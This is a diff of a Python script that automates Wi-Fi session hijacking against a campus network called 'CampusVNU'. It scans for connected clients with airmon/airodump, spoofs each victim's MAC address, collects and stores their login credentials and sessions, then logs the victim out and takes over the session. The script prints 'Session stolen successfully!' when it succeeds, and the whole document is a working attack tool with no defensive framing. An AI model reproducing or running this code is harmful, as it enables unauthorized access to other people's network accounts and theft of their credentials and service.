@@ -1,94 +1,112 @@
+#!/usr/bin/env python
+
 import os
 import time
 
-from network.campusvnu import CampusVNU
-from session.backup import store_data
+from pwn import log, success
+
+from model.isp.campusvnu import CampusVNU
 from tools.airmon import Airmon
 from tools.airodump import Airodump
-from tools.macchaner import Macchanger
-from tools.networkmanager import NetworkManager
-
-if os.geteuid():
-    print("[x] Run script as root!")
-    exit(0)
 
 
-interface = "wlp5s0"
-interface = Airmon.start(interface)
-network = CampusVNU()
+def checkroot():
+    if os.geteuid():
+        log.error("Run script as root!")
 
-with Airodump(interface, essid_regex=network.name) as airodump:
-    try:
-        while True:
-            os.system("clear")
 
-            print("BSSID\t\t\tPrivacy\t\tPWR\tBeacons\t\tESSID")
-            targets = airodump.get_targets()
-            for t in targets:
-                print(f"{t.bssid}\t{t.privacy}\t\t{t.power}\t{t.beacons}\t\t{t.essid}")
+# TODO: add menu to select interfaces
+def select_interface():
+    global interface
+    interface = "wlp5s0"
 
-            print("\n\nBSSID\t\t\tSTATION\t\t\tPWR\tPackets\t\tProbed ESSIDs")
 
-            all_clients = airodump.get_clients()
-            clients = []
+# TODO: add menu selector
+def select_network():
+    global network
+    network = CampusVNU
 
-            for c in all_clients:
+
+def get_clients():
+    moninterf = Airmon.start(interface)
+    with Airodump(moninterf, essid_regex=network.name) as airodump:
+        try:
+            while True:
+                print("BSSID\t\t\t\tPrivacy\tPWR\tBeacons\tESSID")
+
+                targets = airodump.get_targets()
                 for t in targets:
-                    if t.bssid == c.bssid:
-                        clients.append(c)
+                    print(
+                        f"{t.bssid}\t{t.privacy}\t\t{t.power}\t{t.beacons}\t\t{t.essid}"
+                    )
 
-            clients.sort(key=lambda c: c.packets, reverse=True)
+                print("\n\nBSSID\t\t\t\tSTATION\t\t\tPWR\tPackets\tProbed ESSIDs")
 
-            for c in clients:
-                for t in targets:
-                    if t.bssid == c.bssid:
-                        print(
-                            f"{c.bssid}\t{c.station}\t{c.power}\t{c.packets}\t\t{c.probed_essids}"
-                        )
+                all_clients = airodump.get_clients()
+                real_clients = []
 
-            time.sleep(1)
-    except KeyboardInterrupt:
-        interface = Airmon.stop(interface)
+                for c in all_clients:
+                    for t in targets:
+                        if c.bssid == t.bssid:
+                            c.essid = t.essid
+                            real_clients.append(c)
 
-macchanger = Macchanger(interface)
+                for c in real_clients:
+                    print(
+                        f"{c.bssid}\t{c.station}\t{c.power}\t{c.packets}\t\t{c.probed_essids}"
+                    )
 
-for c in clients:
-    print("[*] Spoofing Clients...")
-    print(f"[+] BSSID: {c.bssid} Client: {c.station}")
+                time.sleep(1)
+                os.system("clear")
+        except KeyboardInterrupt:
+            global clients
+            clients = real_clients
+            Airmon.stop(moninterf)
 
-    print("[+] Changing MAC...")
-    macchanger.change(c.station)
 
-    print("[+] Sleeping 5s...")
-    time.sleep(5)
+def get_creddentials():
+    global sessions
+    sessions = []
 
-    print("[+] Connecting to Wi-Fi... ")
-    for t in targets:
-        if t.bssid == c.bssid:
-            NetworkManager.connect2wifi(t.essid)
-            break
+    for c in clients:
+        session = network(c)
+        session.spoof(interface)
 
-    print("[+] Gathering info...")
-    if network.get_info():
-        network.print_info()
+        if session.get_creddentials():
+            session.print_info()
+            session.store()
+            sessions.append(session)
+        else:
+            session.print_info()
 
-        print("[*] Saving session...")
-        store_data(c, network)
-    else:
-        print("[x] No info!\n")
-        continue
+        print()
 
-    print("[*] Stealing session...")
-    print("[+] Logging out...")
-    network.logout()
 
-    print("[+] Reseting MAC...")
-    macchanger.reset()
+# TODO: print list of accounts with etr and bandwidth
+def hijack():
+    for s in sessions:
+        log.info("Stealing session...")
+        s.print_info()
 
-    print("[+] Connecting to Wi-Fi... ")
-    NetworkManager.connect2wifi(c.bssid)
+        log.info("Logging out...")
+        s.logout()
 
-    network.login()
+        s.reset_mac()
 
-    print("[*] Done!")
-    break
+        log.info("Logging in...")
+        s.login()
+
+        success("Session stolen successfully!")
+        break
+
+
+# TODO: add more isp
+# TODO: add connect offline from saved sessions
+# TODO: remove expired sessions
+if __name__ == "__main__":
+    checkroot()
+    select_interface()
+    select_network()
+    get_clients()
+    get_creddentials()
+    hijack()
